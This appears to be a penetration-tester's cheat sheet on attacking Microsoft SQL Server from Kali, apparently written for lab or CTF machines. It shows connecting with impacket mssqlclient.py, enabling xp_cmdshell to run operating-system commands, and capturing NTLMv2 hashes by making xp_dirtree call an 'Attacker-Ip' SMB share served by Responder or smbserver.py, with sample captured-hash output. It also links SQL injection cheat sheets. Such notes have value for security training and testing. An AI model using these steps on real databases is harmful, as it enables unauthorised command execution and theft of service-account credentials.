# Microsoft SQL Server

SQL Server supports two authentication modes, Windows authentication mode and mixed mode.
* Windows authentication is the default, and is often referred to as integrated security because this SQL Server security model is tightly integrated with Windows. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
* Mixed mode supports authentication both by Windows and by SQL Server. User name and password pairs are maintained within SQL Server.

## Versions

```
Build number 	SQL version
10.xx 	      SQL 2008/2008R2
11.xx 	      SQL 2012
12.xx 	      SQL 2014
13.xx 	      SQL 2016
14.xx 	      SQL 2017
```

https://buildnumbers.wordpress.com/sqlserver/


## Connection string examples by server version
https://www.connectionstrings.com/sql-server/




# Tools to connect to MsSQL from Kali


## impacket mssqlclient.py

```
$ mssqlclient.py Username:Password@10.10.10.125 -windows-auth
```
### Command Execution

By default, the xp_cmdshell option is disabled on new installations. We need to enable it.

```
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO  
```

One-line
```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```


```
-- Execute command
xp_cmdshell "whoami"
```
[xp_cmdshell configuration](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-2017)

### Capturing NTLMv2 Hash
In case a command execution is not possible we can use Responder to set up a rogue SMB server.
From MsSQL we make a request to any share in our attacker IP, windows will try to authenticate using the user credentials and will send the NTLMv2 hash.

```
$ responder -i tun0

[+] Listening for events...

[SMBv2] NTLMv2-SSP Client   : 10.10.10.xxx
[SMBv2] NTLMv2-SSP Username : Machine\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::Machine:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

Alternative tool would be Impacket smbserver.py that would capture the NTLMv2 hash when user try accessing our share. 

```
$ smbserver.py -smb2support myshare /Share
```

The NTLMv2 hash will be capture when executin the following commands on MsSQL Server

```
declare @q varchar(200);
set @q='\\Attacker-Ip\AnyShareName';
exec master.dbo.xp_dirtree @q;
```

[Medium Artcile](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478)
[Ippsec Giddy Machine](https://www.youtube.com/watch?v=J2unwbMQvUo&t=1410s)

## DBeaver
Need to be installed
GUI 

```
$ apt-get install dbeaver
```


# SQL Injection - Cheat Sheet

- https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
- http://webcache.googleusercontent.com/search?q=cache:qfnxkRmzzNsJ:pentestmonkey.net/cheat-sheet/sql-injection/mssql-sqlinjection-cheat-sheet+&cd=1&hl=en&ct=clnk&gl=ca&client=ubuntu
